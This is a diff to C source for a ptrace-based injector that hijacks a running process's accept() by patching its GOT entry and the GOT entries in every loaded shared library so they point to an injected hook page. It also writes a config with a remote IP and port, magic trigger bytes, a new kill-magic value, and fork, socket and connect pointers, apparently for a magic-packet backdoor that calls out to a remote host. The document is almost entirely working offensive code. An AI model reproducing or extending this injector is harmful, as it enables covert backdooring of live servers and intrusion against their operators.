@@ -107,19 +107,24 @@ static uintptr_t resolve_fn(const char *libc_path, uintptr_t libc_base,
 }
 
 /* ------------------------------------------------------------------ */
-/* Multi-GOT patching                                                   */
+/* Multi-GOT collection + patching                                      */
 /* ------------------------------------------------------------------ */
 
-static void patch_so_gots(pid_t pid, uintptr_t hook_page)
+/*
+ * Enumerate every .so GOT[accept] slot in the target's maps.
+ * Fills addr_out[] with the runtime GOT addresses (up to max_out entries)
+ * and returns the count.  Does NOT write to the target yet.
+ */
+static int collect_so_gots(pid_t pid, uintptr_t *addr_out, int max_out)
 {
     char maps_path[64];
     snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
     FILE *fp = fopen(maps_path, "r");
-    if (!fp) return;
+    if (!fp) return 0;
 
     char (*seen)[256] = malloc(64 * 256);
-    if (!seen) { fclose(fp); return; }
-    int  nseen = 0;
+    if (!seen) { fclose(fp); return 0; }
+    int  nseen = 0, nfound = 0;
     char line[512];
 
     while (fgets(line, sizeof(line), fp)) {
@@ -143,12 +148,47 @@ static void patch_so_gots(pid_t pid, uintptr_t hook_page)
         if (!got_va) continue;
 
         uintptr_t runtime_addr = start + (uintptr_t)got_va;
-        printf("[inject] patching GOT[accept] in %-40s @ 0x%"PRIxPTR"\n",
-               path, runtime_addr);
-        ptrace_write_ptr(pid, runtime_addr, hook_page);
+        if (nfound < max_out)
+            addr_out[nfound++] = runtime_addr;
     }
     fclose(fp);
     free(seen);
+    return nfound;
+}
+
+/* Write hook_page into every collected GOT slot and log each one. */
+static void apply_got_patches(pid_t pid, uintptr_t hook_page,
+                               const uintptr_t *addrs, int n)
+{
+    for (int i = 0; i < n; i++) {
+        /* find the SO name for logging */
+        char maps_path[64];
+        snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
+        FILE *fp = fopen(maps_path, "r");
+        char soname[41] = "?";
+        if (fp) {
+            char line[512];
+            while (fgets(line, sizeof(line), fp)) {
+                uintptr_t start, end, offset;
+                char perms[8], path[256];
+                path[0] = '\0';
+                int r = sscanf(line,
+                               "%"SCNxPTR"-%"SCNxPTR" %7s %"SCNxPTR" %*s %*s %255s",
+                               &start, &end, perms, &offset, path);
+                if (r < 5 || offset != 0) continue;
+                if (addrs[i] >= start && addrs[i] < end) {
+                    const char *base = strrchr(path, '/');
+                    strncpy(soname, base ? base + 1 : path, 40);
+                    soname[40] = '\0';
+                    break;
+                }
+            }
+            fclose(fp);
+        }
+        printf("[inject] patching GOT[accept] in %-40s @ 0x%"PRIxPTR"\n",
+               soname, addrs[i]);
+        ptrace_write_ptr(pid, addrs[i], hook_page);
+    }
 }
 
 /* ------------------------------------------------------------------ */
@@ -219,17 +259,26 @@ int inject_accept_hook(pid_t pid, uintptr_t got_addr,
     ptrace_write_mem(pid, page, code, code_len);
     free(code);
 
-    /* write config at page + 0x400 */
+    /* collect all GOT[accept] addresses before writing config or patching.
+     * slot 0 is the primary GOT entry; the rest come from loaded .so files. */
+    uintptr_t patched_addrs[HOOK_MAX_PATCHED];
+    int n_patched = 0;
+    patched_addrs[n_patched++] = got_addr;
+    n_patched += collect_so_gots(pid,
+                                  patched_addrs + n_patched,
+                                  HOOK_MAX_PATCHED - n_patched);
+
+    /* write config at page + 0x400 — fully populated before any GOT is touched */
     struct hook_config cfg;
     memset(&cfg, 0, sizeof(cfg));
     cfg.real_accept    = (uint64_t)real_accept;
     cfg.remote_ip      = remote_ip;
     cfg.remote_port    = remote_port;
     cfg.local_port     = scope_port;
-    cfg.magic[0]       = 0xDE;
-    cfg.magic[1]       = 0xAD;
-    cfg.magic[2]       = 0xBE;
-    cfg.magic[3]       = 0xEF;
+    cfg.magic[0]       = 0xDE; cfg.magic[1] = 0xAD;
+    cfg.magic[2]       = 0xBE; cfg.magic[3] = 0xEF;
+    cfg.kill_magic[0]  = 0xEF; cfg.kill_magic[1] = 0xBE;  /* deadbeef reversed */
+    cfg.kill_magic[2]  = 0xAD; cfg.kill_magic[3] = 0xDE;
     cfg.fn_fork        = (uint64_t)fn_fork;
     cfg.fn_socket      = (uint64_t)fn_socket;
     cfg.fn_connect     = (uint64_t)fn_connect;
@@ -240,16 +289,18 @@ int inject_accept_hook(pid_t pid, uintptr_t got_addr,
     cfg.fn_exit        = (uint64_t)fn_exit;
     cfg.fn_getsockname = (uint64_t)fn_getsockname;
     cfg.fn_setsockopt  = (uint64_t)fn_setsockopt;
+    cfg.n_patched      = (uint32_t)n_patched;
+    for (int i = 0; i < n_patched; i++)
+        cfg.patched_addrs[i] = (uint64_t)patched_addrs[i];
 
     ptrace_write_mem(pid, config_addr, &cfg, sizeof(cfg));
-    printf("[inject] config   @ 0x%"PRIxPTR"  remote %s:%d  scope_port %d\n",
+    printf("[inject] config   @ 0x%"PRIxPTR"  remote %s:%d  scope_port %d  "
+           "kill_magic=feebdaed  patched=%d slots\n",
            config_addr, inet_ntoa(*(struct in_addr *)&remote_ip),
-           ntohs(remote_port), ntohs(scope_port));
+           ntohs(remote_port), ntohs(scope_port), n_patched);
 
-    ptrace_write_ptr(pid, got_addr, page);
-    printf("[inject] GOT[accept] patched → 0x%"PRIxPTR"\n", page);
-
-    patch_so_gots(pid, page);
+    /* now apply all GOT patches (config is live, hook is ready) */
+    apply_got_patches(pid, page, patched_addrs, n_patched);
 
     ptrace_detach(pid);
 
